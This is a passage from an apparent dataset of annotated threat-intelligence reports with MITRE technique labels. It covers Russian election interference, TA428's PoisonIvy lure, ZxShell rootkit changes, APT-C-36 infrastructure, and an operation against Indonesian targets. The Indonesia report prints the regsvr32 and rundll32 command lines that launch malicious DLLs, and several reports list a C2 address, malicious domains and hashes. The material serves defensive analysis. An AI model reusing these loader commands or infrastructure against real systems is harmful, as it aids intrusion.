Ukraine-Russia gas dispute in 2005,\u00a0[the power outage](https://www.securityartwork.es/2016/02/23/the-blackout-revisited/) the Ukraine experienced earlier this year or the Russian-Chechen conflict manifest the (obvious and known) Russian interest in its geographical area of influence, actions allegedly attributed to\u00a0**APT28**\u00a0which we discussed in the second issue of this saga\u00a0[(in spanish)](https://www.securityartwork.es/2016/07/19/cyber-guerra-fria-ii-grupo-sofacy/).\nReturning to the other side of the pond \u2026 recently in Illinois there was an intrusion into the electoral electronic system which involved\u00a0**the theft of 200,000 voters\u2019 registers**.\nThe same happened in Arizona, but it seems that despite having suffered a similar intrusion they failed to filter information.\nThe White House Press Secretary, Josh Earnest,\u00a0[explained](https://www.whitehouse.gov/the-press-office/2016/08/30/press-briefing-press-secretary-josh-earnest-8302016)\u00a0 that the attack was under investigation, though back then they did not dare ensure which government or criminal group could be behind the attack.\n![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen2post.png)\nThe (dis) information is power\n------------------------------\nThe \u2018Russian presence\u2019 has been hanging around for months around the American electoral environment.\nThis summer, Wikileaks published about 20,000 emails stolen from officers of the Democratic National Committee,\u00a0[many of them embarrassing]\n(http://theduran.com/julian-assange-says-1700-emails-hillary-clintons-collection-proves-sold-weapons-isis-syria/).\nThis leak cost the resignation of the president of the Democratic Party, damaged (and continues to\u2026) the reputation of Clinton\u2019s entourage, and caused them to be accused (between racks) of the attack on the Russian intelligence, as published in\n\u2018[The Washington Post]\n(https://www.washingtonpost.com/politics/hacked-emails-cast-doubt-on-hopes-for-party-unity-at-democratic-convention/2016/07/24/a446c260-51a9-11e6-b7de-dfe509430c39_story.html?hpid=hp_hp-top-table-main_campaign-132pm%3Ahomepage%2Fstory)\u2018 and\n\u2018[The New York Times]\n(http://www.nytimes.com/2016/07/25/us/politics/donald-trump-russia-emails.html?%20hp&action=click&pgtype=Homepage&clickSource=story-heading&module=first-column-region&region=top-news&WT.nav=top-news&_r=0)\u2019.\nGroups like APT28 (already mentioned) and APT29 were identified as possible culprits.\nAs PSYOP was a perfect play; at the right time, and measuring well the tempos, all the dirty rags of the party begin to be exfiltrated, a new scandal added to the \u201d Hillary\u2019s emails \u201d case, when it was uncovered that she used a private mail server to handle, supposedly, confidential information during her time as Secretary of State.\n![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen3post-740x346.png)\nAs my friend Miguel (who you can read about in\u00a0[this recommended blog)](http://www.areopago21.org/)\u00a0tells me, \u201c*You must remember that throughout history, Russia and the USSR before that, has a long history of \u201c[active measures](https://en.wikipedia.org/wiki/Active_measures)\u201d to manipulate, ranging from propagandistic actions, the falsification of official documents to more\u00a0[extreme domestic violence](https://www.amazon.es/Mitrokhin-Archive-Europe-Penguin-History/dp/0140284877)*\u201c.\nWe\u2019ve already talked of\u00a0[The Agency](http://www.nytimes.com/2015/06/07/magazine/the-agency.html?_r=0)\u00a0 in another article in this series, Russian troll factory, supposedly serving the Kremlin.\nTo add more \u2018juice\u2019 to the matter,\u00a0[Michael T. Flynn](https://en.wikipedia.org/wiki/Michael_T._Flynn), former director of the DIA (Defense Intelligence Agency) and criticized for his affinity and good relations with Russia, is one of Trump\u2019s advisors and his name even came up to occupy the vicepresidency.\nThe return of the KGB.\nThe increase of espionage capabilities.\n--------------------------------------------------------------\nAccording to some Russian\u00a0[unofficial sources](http://kommersant.ru/doc/3093174), Russia is planning to  create a super-security agency called\u00a0**Ministry of State Security**\u00a0(MGB, \u041c\u0413\u0411), a name used in the past to define the Soviet intelligence agency of the Stalin era between 1946 and 1953.\nIts main functions were to be the \u2018secret police\u2019, espionage and counterespionage and promoting a policy of surveillance and monitoring to maintain control and prevent disloyalty.\nAlthough this information has not been confirmed by official sources, several experts on Russian security services and a former KGB colonel -Gennady Gudkov- said it would be very likely indeed that Putin carried out this reform in the intelligence services with the aim, among others, that the management of security agencies be more effective, and help eradicate corruption within agencies.\nThis new ministry would be trained on the FSB, could also understand the FSO and the SVR, resembling, according to Kommersant and other experts with the KGB, in which Putin in fact managed to acquire the rank of lieutenant colonel.\nLet us recall that the KGB was split into separate institutions during the collapse of the Soviet Union in 1991.\nAccording to the researcher,\u00a0[Andrei Soldatov](http://echo.msk.ru/programs/albac/41311/), some of the military operations in cyberspace attributed to Russia were coordinated by the FSB by which a \u2018new KGB\u2019 in these times, could mean the return to the old cold war in a new more technological environment and of which we know Russia has a strong technical control.\nBut as I said,\u00a0**this is all speculation**.\nWe must keep in mind that United Russia, the party of Vladimir Putin, obtained 343 of the 450 seats that make up the Duma, increasing its parliamentary representation to 105 seats, thus becoming a constitutional majority.\nBut the question before us is \u2026 Could Russia (or any other State / Group) alter the outcome of the elections by taking advantage of cyberattacks.\nIs Putin trying to meddle in the US presidential elections.\nIs there a conspiracy of the Kremlin to help Trump in the race for the White House.\nLet\u2019s just stay with the first question or we will fry our brains\u2026\nCould the outcome of the elections be altered by taking advantage of cyberattacks.\n----------------------------------------------------------------------------------\n[Rapid7 Community](https://community.rapid7.com/community/infosec/blog/2016/09/19/hacking-the-election-what-to-expect)\u00a0points out that in many states the online vote has no encryption, they have doubts about the security of the voting machines, and agree that while technology makes our life easier, it also introduces some risks, but that, in this case they would be quite controlled and altering the outcome of the elections would be very unlikely.\nIn\u00a0[Krypt3ia](https://krypt3ia.wordpress.com/2016/10/11/scenarios-on-outcomes-from-russian-information-operations-on-the-us-2016-election/)\u00a0 they pose some possible attack scenarios \u2013sure that our readers who have a very twisted mind, would come up with one or more- and the potential damages they would make if they were successful are the following:\n1.**Manipulation of the voting machine.**\u00a0\nLet us remember that the voters commonly do it through an Electoral System of Optical Scanning or voting machines.\nPhysical access to them is needed to manipulate them.\nIt seems unlikely to manipulate them according to official sources, but not impossible.\nThis situation has been highly discussed over the past few years.\n2.**Manipulation of voter lists.**\u00a0\nA scenario based on the latest developments.\nHacking the database of voters in key states could cause chaos on Election Day. One could, for example, manipulate the voting intention polls, disable voters on the voting day claiming they have requested a postal vote \u2026 etc.\nIn the year 2000,\u00a0[some sources](http://elpais.com/diario/2004/10/29/internacional/1099000816_850215.html)\u00a0 claimed fraud in Florida by manipulating certain parameters in the lists of voters \u2013 it was requested that criminals be deleted from them (as they cannot vote) and, it is argued, more than 90,000 people were eventually eliminated who did have the right to vote.\n(In line with this, I leave you the documentary\u00a0[Hacking Democracy](https://es.wikipedia.org/wiki/Hacking_Democracy)\u00a0documenting some research of US citizens on anomalies / irregularities with the electronic voting system they detected during the presidential election to the USA in 2000 and 2004, especially in the County of Volusia (Florida)).\nThe US-CERT is aware of the risks involved with databases of voter registration, and even offers a\u00a0[number of tips](https://www.us-cert.gov/ncas/tips/ST16-001)\u00a0 for prevention.\n3.**Disruption of the electronic process.**\u00a0\nImagine malware in electoral machines that could block them.\nWe would have to stop using them and other means would be used such as ballots, other machines, thus considerably lengthening the process and entering into a state of contingency (\u2026we have already done this in Spain without anyone hacking us :).\nLet us remember that in the Ukraine, three days before the elections, the main servers of the Central Electoral Commission\u00a0[were compromised](https://sputniknews.com/voiceofrussia/news/2014_05_23/CyberBerkut-announces-destruction-of-electronic-system-of-Ukraines-Central-Election-Commission-5809/)\u00a0 and the Security Service of the Ukraine\u00a0[also discovered](http://www.pravda.com.ua/news/2014/05/23/7026217/)\u00a0 a virus installed on the servers, which would have destroyed the election results.\nIn any of the three scenarios,\u00a0**confidence in the electronic system would be partially or totally degraded and the entire electoral system would be in doubt**.\nIn fact, it is not necessary for these cyberattacks to be successful, but to make enough \u2018noise\u2019 to sow doubt in the system and that in itself is a significant damage in this information war in which we are immersed.\nFinally, I must state that Russia considers all these accusations as \u2018anti-Russian hysteria\u2019, and you, what do you think.\n\u00bfInformation warfare by Clinton. Trump . Or is it really Putin.\nWe only know that we know nothing.", "mitre_ids": ["G0007", "G0007", "G0016", "G0035", "G0035"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "TA428 Group abusing recent conflict between Iran and USA\nJanuary 09, 2020\nRecently, a suspicious document has caught our attention due to its recent creation date (06-01-2020) and its title \u201cHow Swuleimani\u2019s death will affect India and Pakistan.doc\u201d which is directly related to recent political events between Iran and the USA.\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-09-16-44-17.png)\nThe document is in RTF format, and has an OLE object related with the Equation Editor.\nDuring the last years, this OLE objects have been a good indicator that a document may aim to exploit the CVE-2018-0798 vulnerability in order to infect with some kind of malware.\nThis particular document turns out to be one of these examples, and does it by dropping a binary called 8.t. in the \u201c% TEMP%\u201d folder of the user.\nUp to this point, everything coincides in terms of TTPs with what is described in the following report, from ProofPoint related with a suspected Chinese cybercrime Group known as [TA428]\n(https://www.proofpoint.com/us/threat-insight/post/chinese-apt-operation-lagtime-it-targets-government-information-technology).\nAfter this infection chain, what we get is a DLL executable file with extension \u201c.wll\u201d used for \u201cWord.addin.8\u201d files, that is installed in the path \u201c%APPDATA%\\Microsoft\\Word\\STARTUP\u201d which causes that MSWord at the next application startup to load this \u201c.wll\u201d executable file.\n(Which also coincides with the TTPs described in the previous post)\nThis DLL consists in a packed version of a PoisonIvy RAT sample, that after a few seconds makes traffic to the C2 server \u201c95.179.131.29\u201d, through port 443, and in case of error, through port 8080 using HTTP traffic.\nThe IP address is part of the infrastructure that appears in the post, indicating that it is probably the same actor reusing his old infrastructure in a new campaign, taking advantage of the conflict mentioned at the beginning of the article.\nIt is always critical to remain alert with any attachments that is related to any recent geopolitical conflict, as previously stated, the attackers usually take advantage of them as a mean of infecting their victims through this kind of phishing campaings.\n| Document SHA256  | 0eb7ba6457367f8f5f917f37ebbf1e7ccf0e971557dbe5d7547e49d129ac0e98 |\n| Poison IvySHA256 | 02dec90a18545d4bfbac5de19c6499142e141c3c0abaecdc8ac56b8eede167aa |\n| Poison IvyC2     | 95.179.131.29 |", "mitre_ids": ["T1566", "T1203", "T1566", "T1204", "T1137", "T1137", "S0012", "TA0011", "T1027", "T1071", "T1566", "S0012"], "anno_name_label": [["GROUP", "TA428"], ["GROUP", "TA428"]], "cti_entity_class": ["CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE"]}, {"cti_report": "APT27 ZxShell RootKit module updates\nJanuary 13, 2020\nWithin the toolset of the different APT groups, one of the most interesting elements and the one that generally worries the most, are their capabilities in Ring0, generally RootKit/Bootkit type threats that act with the maximum level of privileges.\nAn example of this type of threats is the RootKit module of ZxShell RAT used by Emissary Panda (APT27), of which there is a relatively recent sample (Uploaded to Virustotal since 2019-09-21 17:59:39) that is also correctly signed, so it can be loaded in the latest version of Windows 10 and is perfectly functional as far as we have been able to check.\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-13-11-32-47.png)\nSysmon DriverLoaded event\nA complete analysis of this threat can be found made by the analyst Ori Damari (@0xrepnz) in his blog (<https://repnz.github.io/posts/autochk-rootkit-analysis/>).\nAfter analyzing this threat and describing its capabilities, he has rewritten the source code from a sample of this threat uploaded in 2018 to Virustotal, and published it in GitHub, which greatly facilitates the analysis of newer versions.\nAs he describes in his blog, the capabilities of this Rootkit are basically the following:\n* **File Redirection**\n\u2013 Redirect malicious files to benign files.\nIf you try to call CreateFile() to open a malicious file you\u2019ll get a handle to a benign file.\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-13-11-39-50_arrows-1024x435.png)\n* **Network Connection Hiding**\n\u2013 Hide network connections from tools like netstat,proceshacker\u2026\nWe found interesting to analyze the differences between the 2018 version and the most recent 2019 version in order to try to identify new capabilities or changes in its capabilities.\nAfter comparing both samples using the GitHub source code, we have been able to see that most of the functions are identical, except for 5 of them (including the Driver\u2019s entrypoint):\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-10-14-25-57-1024x188.png)\nIdentical functions in both versions\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-10-14-25-24.png)\nDifferent functions\nAfter analyzing the differences between this 5 funtcions, we have been able to observe that all the changes are focused on avoiding detections by slightly \u201cobfuscating\u201d some IOCs hardcoded as strings and code modification without impact in the capabilities on the driver\u2026\nIn total, there are three notable changes between the two versions:\n* The first one basically consists in that they have reversed the list of strings that identify the files that the Driver hides by default when it is loaded:\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-13-12-48-53.png)Old and New list of file names\nAt code level, the impact this has had is that the function that redirects these files, now uses the \u201cwcrev\u201d function that flips the strings before passing them to the function that hides the files:\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-13-11-19-52Arrows-1024x346.png)\nNew code (Red) and old code (Green)\n* Secondly, they have tried to disguise their use of the undocumented Microsoft API \u201cObReferenceObjectByName\u201d, which is used to get the pointer to the different Driver\\_Object drivers they intend to hook in each case.\nUntil now, they had the name of this function in their strings, and used it to resolve it by passing its name to the MmGetSystemRoutineAddress API which returns a pointer to it.\nNow they only keep part of the name, and complete the rest in a slightly more complex way before calling MmGetSystemRoutineAddress by building it from characters they store in the registers and other areas of the binary:\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-13-11-34-49-1-1024x564.png)\n*New code (Red) and old code (Green)*\n* Finally, they have moved part of the logic of some functions to another point, maintaining the same functionality.\nAn example is the end of the driver entry function, where untill now, at the end they only called two functions that initialized the logic of hiding connections and redirecting files, and now, they have extracted part of the logic of these functions and moved it right after each one of them, but without any impact on the capabilities and behavior of the Driver:\n![](https://lab52.io/blog/wp-content/uploads/2020/01/Captura-de-pantalla-de-2020-01-10-14-49-10-1024x130.png)\n*New code (Red) and old code (Green)\ufeff*\n| x64 Sample | 42eab05c611bf24d86bb6c985caa2ad7380ed7d98340c7f08de9361be14dc244 |\n| x86 Sample | 9b7c1e37d5f56cc0b5e5e22ce9805e237a189297e78405b9c392a0953b6e0321 |", "mitre_ids": ["S0412", "T1014", "T1014", "T1542", "T1014", "S0412", "T1014", "T1036", "T1036", "T1564", "T1564", "T1027", "T1027", "T1027"], "anno_name_label": [["GROUP", "Emissary Panda"], ["GROUP", "Emissary Panda"], ["GROUP", "Emissary Panda"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "APT-C-36 recent activity analysis\nJanuary 15, 2020\nFrom Lab52 we have been tracking during the last months the activity of the group APT-C-36.\nThis group was named and publicly introduced by the Company 360 [1] last year.\nIn this article is highlighted as the main objective of the group, the companies located in Colombia.\nIf you don\u2019t know APT-C-36, we recommend the article mentioned [1] for more information.\nIn July 2019 the company TrendMicro published an article related to another group [2] that also seems to be focused on Colombia and some **TTPs** (**T**actics, **T**echniques and **P**rocedures) overlap with APT-C-36 although TrendMicro indicates that they don\u2019t consider this group as an advanced.\nLab52 has had access to different very recent spear-phishings and the following summary information has been obtained from the analysis of these mails:\n* This is a group that, as already mentioned in the articles [1] and [2], knows well the Spanish language.\n* They usually use different types of url shorteners in their mailings.\nThe case of \u201ccort.as\u201d shortenner has caught our attention since it is a shortener from the Spanish newspaper \u201cEl Pais\u201d that belongs to the \u201cPrisa Group\u201d very spread in Latin America.\n* We have also seen links to docs.google.com, mediafire and onedrive to download the samples inside some malspam emails.\n* Their most popular malware is LimeRAT, although many others have been found as indicated in the reports.\nVJWorm has also been seen recently with different techniques for exfiltration.\n* It has also been observed from some spear-phishings the exfiltration by Yopmail\u2019s HTTPS webmail service.\nThis coincides with the indications of TrendMicro\n* The most common dynamic domains seen are:\n1.duckdns.]org\n2.publicvm.]com\n3.linkpc.]net\nSince Lab52 does not have enough information to be able to say that everything analyzed is a single group, it can only be said that these are different techniques used to attack a country.\nFrom this information, the infrastructure used by the attackers as command and control servers when executing the malware has been analyzed and the following graph has been obtained:\n![](https://lab52.io/blog/wp-content/uploads/2020/01/image1.png)\nThree sets (clusters) of ip addresses have been identified and each one has some characteristics:\n***Cluster A*** has the following characteristics:\n* All its infrastructure is geolocated in Colombia.\nAll the IPs correspond to Colombian ISPs\u2019 IPs. This is perhaps one of the most outstanding aspects.\n* Domains are reused and the ip to which it points is changed.\n* This cluster only uses free \u201cduckdns.org\u201d domains.\n***Cluster B*** has the following characteristics:\n* Its infrastructure is located in Colombia, Costa Rica and Panama.\nThe geolocated ip\u2019s in the United States correspond to domains that have been \u201csinkholed\u201d.\nBy obtaining more information about the IPs, it can be seen how they are using a VPN service that allows having geolocalized IPs in Colombia, Costa Rica and Panama.\nThe service is called \u201cPowerhouse Management\u201d (phmgmt[.]com).\nTherefore this cluster is not compromising infrastructure of Colombian ISP clients, but is using this VPN service.\n* This cluster is reusing domains and changing ip addresses a lot.\nThey have a very short duration.\n* This cluster uses as SLD linkpc.net and publicvm.com.\n* This cluster coincides with part of the domains registered in the report of the Chinese company 360 on APT-C-36.\n**Cluster C** has the following characteristics:\n* All its infrastructure is geolocated in Colombia.\nAll the IPs correspond to Colombian ISPs\u2019 IPs.\n* In this case many domains are used and few ip addresses.\n* This cluster uses free domains duckdns.org.\nAmong the domains used by these group/s we highlight the domain:\n* **cobroserfinansa[.]com**:\nThis domain has solved more than 150 different ip\u2019s (157 exactly when this report was made) where all of them have been located in Colombia.\nAnother outstanding aspect from the infrastructure point of view is that the ip\u2019s located in Colombia correspond with a high probability to ip\u2019s of routers compromised by the attackers.\nLab52 hypothesis is that attackers compromise routers with default credentials and use them as a frontend for their real command and control server.\nThis fact has not been verified by Lab52, but has been observed as a common TTP for other groups.\nThe routers seen, allow the use of the iptables command so automation by attackers for redirection is simple.\nConclusions\n-----------\n* The attackers know well the language of the attacked country, Spanish, so it could be considered Spanish-speaking countries as the main options of attacking countries.\nThis aspect has already been indicated in the other reports.\nFrom Lab52 we would reinforce this hypothesis by the use of a shortener \u201ccort.as\u201d.\n* The emails are well written and are almost always related to financial matters, specifically related to debt.\n* Currently, the attackers are not using malware developed by themselves and are using public malware projects such as LimeRAT.\n* Attackers are using high ports to communicate with command and control servers.\n* Attackers are probably using multi-level command and control architectures to hide the main command and control server.\nAs a first level, they have used until the moment:\n+ VPN services where Colombia, Panama and Costa Rica exist as an outgoing ip\n+ Routers from ISP clients with default credentials or vulnerabilities.\nAll these ISPs belong to Colombia.\n* Attackers use shorteners for links in emails.\nIt is advisable to watch out for shortcuts belonging to the newspaper \u201cEl Pais\u201d.\n* Another option to the shorteners are links to file hosting services (google, mediafire, dropbox, etc.\n[1] <https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/>\n[2] <http://blog.la.trendmicro.com/proyecto-rat-una-campana-de-spam-dirigida-a-entidades-colombianas-a-traves-del-servicio-de-correo-electronico-yopmail/>", "mitre_ids": ["G0099", "G0099", "G0099", "G0099", "T1566", "T1566", "T1566", "TA0010", "T1566", "T1020", "TA0011", "G0099", "TA0011", "T1583", "T1566", "T1571", "T1104", "T1566"], "anno_name_label": [["MALWARE", "LimeRAT"], ["MALWARE", "VJWorm"], ["MALWARE", "LimeRAT"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CI"]}, {"cti_report": "Intelligence operation against targets in Indonesia\nFebruary 12, 2020\nLab52 has detected malicious activity targeting Indonesian victims.\nThis activity could be linked to an intelligence operation.\nWe have been tracking this activity since December 27th of 2019\nThe main tools of this threat actor, are built as DLL files, and launched with this commands:\n* \u201cC:\\Windows\\System32\\rundll32.exe\u201d shell32.dll,ShellExec\\_RunDLL regsvr32 /s C:\\ProgramData\\pubpool.dll /i:process104.dll\n* \u201cC:\\WINDOWS\\system32\\regsvr32.exe\u201d /s C:\\ProgramData\\pubpool.dll /i:process104.dll\n| **process100.dll**      |  5813497bde09577bd1adf24b02707918bb15af62  |  Uploaded to Virus Total Intelligence on 12-07-2019 from Indonesia.|\n| **runtime\\_report.dll** | 1815820307a23b99d93e7307ade8b6443bbb8e96   |  Uploaded to Virus Total Intelligence on 2019-07-17 12:29:35 from Indonesia.|\n| **process104.dll**      |  f09176a5130c17356ad2aa5850ca14a0a02a9ded  |  Uploaded to Virus Total Intelligence on 2019-07-17 12:29:10 from Indonesia  |\n| **pubpool.dll**         | e7b27d5e936d8dedc55ebe4ff64020d1bf4238b2   | Uploaded to Virus Total Intelligence on 2019-07-17 12:29:26 from Indonesia  |\nPubpool.dll is used as a loader for three more encrypted dll that have been found during the incident research:\n**1. pubpool.dll file**\nLab52 has analyzed pubpool.dll and this component has code to decrypt and load files, working as a dll loader.\nIn the next picture, you can see one example of a dll being decrypted by pubpool in memory:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-1024x444.png)library loaded in memory.\n**2. process104.dll file**\nWhen we launch pubpool.dll with process104.dll as parameter, this dll maps this section:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-1.png) process104.dll is decrypted and mapped as inject\\_usb.dll.\nIt\u2019s main purpose is to infect USB devices.\nThis library exports a function named \u201cdone\u201d.\nThe function can be seen in the next picture:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-2.png)\n\u201cDone\u201d function checks for the existence of a mutex and starts if there isn\u2019t another instance in execution.\nInject\\_usb.dll creates a folder named **\u201c.Recycle Bin\u201d** in every removable device and a log file named **\u201csi.log\u201d**.\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-3.png)\n**3. process100.dll file**\nWhen we launch pubpool.dll with process100.dll as a parameter, this dll maps the next sections:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-4.png)\nprocess100.dll is decrypted and mapped as inject\\_host.dll.\nThis module execute the malware.\nIn the next pictures there is some IOCs:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-5.png)\nOne LNK example:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-6.png)\n**4. runtime\\_report.dll file**\nWhen we launch **pubpool.dll** with runtime\\_report.dll as parameter, the loader maps this section:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-7.png)\n**runtime\\_report.dll** is decrypted and mapped as **TinyMet.dll**.\nThis module deploys TinyMET[1], a \u201ctiny\u201d meterpreter stager.\nThis TinyMet version has a Mutex TEST\\_9I89JNDBPWQ9ND:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-8.png)\nTinyMet connects to Internet using a Hardcoded domain and User-Agent that can be seen in the next picture:\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-9-1024x440.png)\n* Domain: musicstore.global.ssl.fastly[.]net\n* User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\n**5. CONCLUSION**\nLab52 has the hypothesis that this infection is part of an intelligence operation.\nIt\u2019s a malware developed by a threat actor (currently, it\u2019s not possible to identify the malware family).\nAttribution is not possible with the information handled by Lab52.", "mitre_ids": ["T1218", "T1218", "T1218", "T1140", "T1140", "T1091", "T1218", "T1218"], "anno_name_label": [["TOOL", "Meterpreter"], ["TOOL", "Meterpreter"], ["TOOL", "Meterpreter"]], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE"]}, {"cti_report": "The role of China in the Persian Gulf and potential cyberthreats:\nFebruary 18, 2020\nAfter the rise of tensions between the US and Iran due to the US military operation that ended the life of the Iranian General Qasem Soleimani and the Iraqi Commander Abu Mahdi al-Muhandis ([12]), Iran carried out an attack with missiles against two US military bases located in Iraq ([13]).\nThese events have generated a climate of uncertainty and an increase of geopolitical risk in one of the most relevant areas, the Persian Gulf.\nThis fact does not only involve the US and Iran, furthermore it involves other actors with a high influence in the world order such as China.\nThis phenomenon could provoke that China carries out certain strategies to keep its energy interests safeguarded in the Middle East area.\nDuring 2019, some technical traces were detected and this traces where potentially related to certain APT groups presumably associated with the People\u2019s Republic of China (APT10) that would be carrying out malicious campaigns against various targets like critical infrastructures \u00a0organizations among others ([14]) ([15]).\nIn the past, the relationship between Tehran and Beijing was based on a trade agreement focused in the exchanging of crude oil and weapons ([19]).\nRegarding the second point, in the war between Iran and Iraq (1980-1988), when the targets of both actors were the oil stations and oil freighters, reaching the blockade of the Strait of Hormuz, the situation began to be unsustainable from the point of view of the trade of crude.\nIn order to reduce the tension, the USSR and the USA, agreed in 1985 to cease the sale of weapons.\nHowever, according to the Stockholm International Institute for Peace,\nChina was always faithful to Iran to keep the arm sales operations and currently it is still being one of the most relevant Iran\u2019s partners ([21]).\nThe Chinese interests in Iran directly clashed with the long-standing confrontation between the USA and Iran since the fall of Shah M. Reza Pahlavi and subsequently with the power of Ayatollah R. Khomeini in 1979, establishing the Islamic Republic of Iran, thus Islamic Revolution ended its westernization.\nThat\u2019s why, currently the new commercial approach between the US and China comes with the US imposition to try to finish within the crude oil trade with Iran.\nConsequently, china has significantly reduced its crude oil imports from Iran since the US again imposed sanctions during November 2018 ([16]).\nDuring 2015, the Obama Administration carried out jointly with Iran, Germany, Great Britain, China, France and Russia, the Tehran nuclear agreement, at those time China significantly increased its commercial ties with Iran.\nDuring 2016, Iran and China agreed to expand bilateral ties and increase trade to $ 600 billion by 2025.\nThis business planning was truncated at the time that the Trump Administration withdrew from the Nuclear Pact.\nChinese imports of Iranian crude oil fell from 650,000 barrels per day to an average of 140,000 barrels in recent months ([16]).\nChina, in response to the impossibility of establishing and developing business operations with Iran, imported a total of 76.3 million tons of crude oil from Saudi Arabia in the first 11 months of last year, 53% more than in the same period of 2018 ([16]).\nOn the other hand, Iranian oil exports fell to 14.4 million tons.\nMoreover, China has a relative neutral role in the Iran-USA conflict, Pekin is trying to strength the ties with Saudi Arabia, looking to supply them specific military material and weapons that the USA does not supply them as the CH-4 UAV drones, similar to the American MQ-1 Predator ([21]).\nChina aims to balance its crude oil suppliers against the rise of instability in the Middle East.\nIn addition, China is one of the world\u2019s leading oil consumers, this means that its economy has an important high dependence on oil.\nAs can be seen in the following table, China remain in the second place in the top of oil consumers after the US ([6]).\n| **Country**         | **M. barrels per day**      | **Share of world total** |\n|  United States      |  19.96                      |  20%                     |\n|  China              |  13.57                      |  14%                     |\n|  India              |  4.34                       |  4%                      |\n|  Japan              |  3.92                       |  4% \u00a0                    |\n|  Russia             |  3.69                       |  4%                      |\n|  Saudi Arabia       |  3.33                       |  3%                      |\n|  Brazil             |  3.03                       |  3%                      |\n|  South Korea        |  2.63                       |  3% \u00a0                    |\n|  Germany            |  2.45                       |  2%                      |\n|  Canada             |  2.42                       |  2% \u00a0                    |\n|  Total top 10       |  59.33                      |  60%                     |\n|  World total        |  98.76                      |                          |\n*Illustration 1. Oil consumption (2018)*\nMoreover, as can be seen in the following graph, China ranks fifth in the ranking of oil producing countries in the worldwide ([6]):\n| **Country**         | **Million barrels per day** | **Share of world total** |\n| United States       |  17.94                      |   18%                    |\n| Saudi Arabia        |  12.42                      |   12%                    |\n| Russia              |  11.40                      |   11%                    |\n| Canada              |  \u00a05.38                      |   \u00a05%                    |\n| China               |  \u00a04.81                      |   \u00a05%                    |\n| Iraq                |  \u00a04.62                      |   \u00a05%                    |\n| Iran                |  \u00a04.46                      |   \u00a04%                    |\n| United Arab Emirates|  \u00a03.79                      |   \u00a04%                    |\n| Brazil              |  \u00a03.43                      |   \u00a03%                    |\n| Kuwait              |  \u00a02.91                      |   \u00a03%                    |\n| Total top 10        |  71.15                      |   \u00a071%                   |\n| World total         | 100.89                      |                          |\n*Illustration 2. Origin of oil imports in China.*\nThe graph shows us that a significant part of China\u2019s oil suppliers comes from politically unstable regions and must be transported through narrow and sea lanes disputed with other States with high military competence.\nIt is relevant for China to keep these logistic access roads insured to keep its development and economic expansion.\nIn addition, this dependence on foreign energy resources is likely to increase considerably.\nIt is expected that in 2040 about 80% of the oil consumed by China will come from other States ([7]).\nFor this reason, China is interested in investigating and controlling the instability in the Middle East, since a significant percentage of its oil imports come from Iran, Iraq, Saudi Arabia, Oman and Kuwait, all within the Persian Gulf.\nTo maintain this flow of energy resources, China and the Saudi King Salman signed an oil trade agreement for $ 65 billion in 2017 ([8]).\nIn addition, the OBOR route, the main international route to carry out the transport of goods, is increasingly getting consolidated and more functional.\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-10.png)\n*Illustration 3. OBOR route for the oil trade.*\nCurrently, all imports from Iran and Saudi Arabia are introduced into China through the Malacca Canal, near the South China Sea.\nProbably, the presence and influence of China in the Middle East is not going to be militarily.\nHowever, it constantly looks for diplomatic and business opportunities to acquire organizations from the energy sector in order to accomplish their future energy demands ([9]).\nThese business and diplomatic opportunities could be preceded by cyber espionage operations with the purpose of acquiring advantages in the sector.\nOrganizations in the energy sector have important confidential information that certain governments may be highly interested in.\nThe energy organizations which are located in certain Middle East locations of interest of China would be a potential target of cyberespionage.\nCAMPAIGN AGAINST THE USA ADMINISTRATION AND THE ENERGY SECTOR\nDuring 2019, a malicious campaign was executed against US public sector organizations.\nThis campaign, due to the macros used, is likely to be attributed to APT10, a group allegedly linked to the Ministry of Security and Intelligence of China ([1]) ([18]).\nThe malware used was \u201cLookback.\nThe spear phishing carried out an impersonation of GEC (Global Energy Certification) to offer certain certification courses ([2]).\nTopic which would be highly interesting for critical infrastructure or energy professionals.\nSeveral spear phishing emails came from the following malicious domain: globalenergycertification[.]Net. The same domain was used in previous malicious campaigns.\nThe hostile actor tries to impersonate a licensing agency that is linked to the public sector globalenergycertification[.]Org. In the body of the email, topics are included to impersonate the \u201cGlobal Energy Certification\u201d (GEC).\nThe word file attached in the email has the macros that once is downloaded and executed infects the systems of the victim ([2]).\nDuring the first stages of the infection it was possible to identify that the attackers carried out a reconnaissance phase through SMB scans on the port 445.\nThis activity was carried out two weeks before to the reception of spear phishing.\nThe 